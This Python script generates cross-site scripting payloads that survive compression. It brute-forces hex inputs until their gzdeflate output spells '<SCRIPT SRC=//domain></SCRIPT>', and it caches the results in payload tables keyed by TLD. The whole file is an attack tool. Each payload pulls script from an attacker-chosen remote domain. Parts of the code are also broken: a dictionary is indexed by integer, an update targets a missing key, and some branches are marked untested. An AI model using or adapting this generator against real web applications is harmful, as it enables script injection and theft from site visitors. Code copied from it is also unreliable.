#from multiprocessing.dummy import Pool
from multiprocessing import Pool
from binascii import unhexlify
from zlib import compress
import re, os, json,sys

domain_template_table = {
    "BZ":          ["f399281922111510691928276e6e{}1e581b1f576e69b16375535b6f0e7f", 0x111111, 0xffffff],  # Credit to Adam Logue
    "PE":          ["7ff399281922111510691928276e6e{}1e51241f576e69b16375535b6f", 0x111111, 0xffffff],  # Credit to fin1te
    "CZ":          ["f399281922111510691928276e6e{}1e681b1f576e69b16375535b6f", 0x111111, 0xffffff],  # Credit to Vavkamil
    "CC":          ["f399281922111510691928276e6e{}1e68281f576e69b16375535b6f0e7f", 0x111111, 0xffffff],
    "threeXthree": ["f399281922111510691928276e6e{}1e51241f576e69b16375535b6f", 0x111111,   0xffffff],  # PE tld crutch
    "fourXtwo":    ["f399281922111510691928276e6e{}1e51231f576e69b16375535b6f", 0x11111111, 0xffffffff]  # PE tld crutch
}


tld_template_table = {
    "threeXthree":   ["7ff399281922111510691928276e6e5111111e{}576e69b16375535b6f",   0x111111, 0xffffff],  # PPP domain crutch - not tested
    "fourXtwo":      ["f399281922111510691928276e6e511111111e{}576e69b16375535b6f0e7f", 0x1111, 0xffff],  # PPPP domain crutch - not tested
    "threeXtwo":     ["f399281922111510691928276e6e5111111e{}576e69b16375535b6f0e7f",   0x111111, 0xffffff],  # PPP domain crutch - tested
}

def domain_parse(domain):
    prefix = ".".join(domain.split(".")[:-1])
    tld = "".join(domain.split(".")[-1:])
    return prefix, tld

def gzdeflate(string):
    deflated = compress(string, level=6)[2:-4]
    return deflated

# Use a top-level work function
# so that bruteforcing is not limited by Global Interpreter Lock (GIL)
def work(arg):
    l = arg[0]
    template = arg[1]
    brange = arg[2]
    num = f"{l:x}"
    t = template.format(str(num).zfill(brange))
    x = gzdeflate(unhexlify(t))
    return (x,t)

# Nasty hack to get around global races across
# spawned processes
def gen(start, end, template, brange):
    while start < end:
        yield (start, template, brange)
        start += 1

class Attack():
    def __init__(self, template, start, end, payload="", poolSz=4):
        self.template = template
        self.start = start
        self.end = end
        self.payload = payload
        self.range = int(end.bit_length() / 4)
        self.pool = Pool(poolSz)

    def hex(self, num):
        num = f"{num:x}"
        return str(num).zfill(self.range)

    def f(self, l):
        # replaced by work() when not using threading
        t = self.template.format(self.hex(l))
        x = gzdeflate(unhexlify(t))
        return (x, t)

    def attack(self):
        for result in self.pool.imap_unordered(work, gen(self.start, self.end + 1, self.template, self.range), 1000):
            if self.payload.upper() in result[0].decode(errors='replace').upper():
                self.pool.close()
                self.pool.join()
                print("{},{}".format(self.payload, result[1]))
                return result[1]
        self.pool.close()
        self.pool.join()

#################
# Table Helpers #
#################
class PayloadTable:
    def __init__(self, tld):
        self.tld = tld.upper()
        self.tbl_path = tbl_path = os.path.join('xss_payload_tables', '%s.json' % self.tld)
        self.tbl = None

    def load(self):
        if os.path.exists(self.tbl_path):
            with open(self.tbl_path, 'r') as f:
                self.tbl = json.loads(f.read())
                return True
        return False

    def save(self):
        if not os.path.exists('xss_payload_tables'):
            os.mkdir('xss_payload_tables')
        with open(self.tbl_path, 'w') as f:
            f.write(json.dumps(self.tbl, sort_keys=True))
   
    def lookup(self, prefix):
        # We do lookups based on TLD - since the attack template we use is TLD based for these
        # This let's us store the template and only the unique payload bytes - greatly reducing table sizes
        if not self.tbl and self.load() == False:
            return None # table does not exist
    
        # Do a lookup on the table
        prefixSzKey = str(len(prefix))
        tmp = self.tbl.get(prefixSzKey) # sorted by prefix/domain len
        if not tmp:
            return None
        template = tmp['template']
        payloads = tmp['payloads']
        payload = payloads.get(prefix.upper())
        if not payload:
            return None
        payload = template.format(payload)
        print("[+] Found previous payload: %s" % payload)
        return payload
    
    def insert(self, prefix, template, payload, save=True):
        # Extract unique payload from template - works as simple compression for table sizes
        needle = template.format('(.*)')
        m = re.match(needle, payload)
        uniq_pay = m.group(1)

        prefixSzKey = str(len(prefix))
    
        if not self.tbl and self.load() == False:
            self.tbl = {prefixSzKey: {'template':template, 'payloads': {prefix.upper(): uniq_pay}}}
        else:
            if prefixSzKey not in self.tbl.keys():
                # first domain of this size
                self.tbl[prefixSzKey].update({'template':template, 'payloads': {prefix.upper(): uniq_pay}})
            else:
                # insert/update new domain 
                self.tbl[prefixSzKey]['payloads'].update({prefix.upper(): uniq_pay})

        if save:
            # Save the new table to disk
            self.save()
    
def domain_brute(target, prefix, tld, update=False, threads=4):
    target = "<SCRIPT SRC=//{}></SCRIPT>".format(target.upper())

    # Check payload tables first
    pt = PayloadTable(tld)
    payload = pt.lookup(prefix)
    if payload:
        print('[+] Using payload from table!')
        return payload

    print("=== Bruteforce === ")
    print("[+] Target Payload:", target)

    # Determine attack template
    complex = 0
    if len(prefix) > 3:
        print("[+] Domains > 3 -- Not implemented yet!")
        return
    if tld.upper() in domain_template_table.keys():
        print("[+] Known tld found, using fast attack!")
        template = domain_template_table[tld][0]
        start = domain_template_table[tld][1]
        end = domain_template_table[tld][2]
        payload = Attack(template, start, end, payload=target, poolSz=threads).attack()
        return payload
    elif (len(tld) == 3) and (len(prefix) == 3):
        print("[+] Using threeXthree attack...")
        print("[+] Attempting to bruteforce tld first")
        # attack tld first using PPP domain as a crutch
        target = "<SCRIPT SRC=//PPP.%s></SCRIPT>" % tld.upper()
        template = tld_template_table["threeXthree"][0]
        start = tld_template_table["threeXthree"][1]
        end = tld_template_table["threeXthree"][2]
        tld_cracked = Attack(template, start, end, payload=target, poolSz=threads).attack()

        # if succesfful, build domain template using discovered tld as crutch
        if tld_cracked:
            print("[!] COMPLETE: tld found -- attacking domain next")
            regex = '6e6e511111111e(.*)576e69b163'
            m = re.search(regex, tld_cracked)
            if m:
                construct = tld_template_table[0] % m.group(1)
                template = construct.replace("511111", "%s")
                print("[-] Domain Attack Template: %s" % template)
        else:
            print('[!] Failed to crack tld')
            return None

        # attack domain using discovered tld as crutch
        target = "<SCRIPT SRC=//%s.%s></SCRIPT>" % (prefix, construct)
        start = domain_template_table["threeXthree"][1]
        end = domain_template_table["threeXthree"][2]
        payload = Attack(template, start, end, payload=target, poolSz=threads).attack()

        if payload:
            if update:
                pt.insert(prefix, template, payload)
            return payload
    else:
        print("Attack for this domain not implement yet")
        return False
